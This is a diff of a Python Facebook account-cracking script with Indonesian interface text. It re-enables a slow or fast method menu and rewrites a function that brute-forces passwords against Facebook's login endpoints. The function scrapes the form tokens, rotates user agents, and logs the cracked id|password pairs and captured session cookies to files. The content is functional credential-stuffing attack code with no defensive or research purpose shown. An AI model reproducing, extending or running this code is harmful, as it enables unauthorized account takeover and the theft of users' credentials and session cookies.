@@ -1486,15 +1486,15 @@ def setting():
         ualuh.append("tidak")
 
      # Pilihan kecepatan metode
-    metcepat()
-    #Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",width=60,style=f"{color_panel}"))
-    #hc = console.input(f" {H2}• {P2}Masukan : ").strip()
-    #if hc in ["1", "01"]:
-        #metslow()
-    #elif hc in ["2", "02"]:
-        #metcepat()
-    #else:
-        #metcepat()  # Default ke metode cepat
+    #metcepat()
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}",width=60,style=f"{color_panel}"))
+    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
+    if hc in ["1", "01"]:
+        metslow()
+    elif hc in ["2", "02"]:
+        metcepat()
+    else:
+        metcepat()  # Default ke metode cepat
         
 
 # -------------------[ CRACK-SLOW ]------------#
@@ -1904,56 +1904,86 @@ def fankytouchckk(idf, pwv):
         except requests.exceptions.ConnectionError:
             time.sleep(31)
     loop += 1
-	
-#-------------------[ CRACK-MAIN ]------------#
-def fanky_b_api(idf,pwv):
-	global loop,ok,cp
-	rr = random.randint
-	rc = random.choice
-	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen) 
-	ua2 = random.choice(ugen)
-	ses = requests.Session()
-	prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des) 
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			requ=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
-			data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',requ.text).group(1), "li": re.search('name="li" value="(.*?)"',requ.text).group(1), "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
-			head = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Referer": "https://iphone.facebook.com/", "Origin": "https://iphone.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1"}
-			fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/','https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
-			po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok += 1
-				coki = ses.cookies.get_dict()
-				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
 
-	
+#-------------------[ CRACK-MAIN ]------------#
+def fanky_b_api(idf, pwv):
+    global loop, ok, cp
+    rr = random.randint
+    rc = random.choice
+    bo = random.choice([m, k, h, b, u, x])
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen)
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh:ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+            data = {
+                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
+                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "prefill_contact_point": idf,
+                "prefill_source": "provided_or_soft_matched",
+                "prefill_type": "contact_point",
+                "first_prefill_source": "provided_or_soft_matched",
+                "first_prefill_type": "contact_point",
+                "had_cp_prefilled": "true",
+                "had_password_prefilled": "false",
+                "is_smart_lock": "false",
+                "_fb_noscript": "true",
+                "email": idf,
+                "pass": pw
+            }
+            head = {
+                "User-Agent": ua,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Referer": "https://iphone.facebook.com/",
+                "Origin": "https://iphone.facebook.com",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
+                "DNT": "1"
+            }
+            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
+            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 #-------------------[ CRACK-MAIN ]------------#
 def fankytouch(idf,pwv):
 	global loop,ok,cp
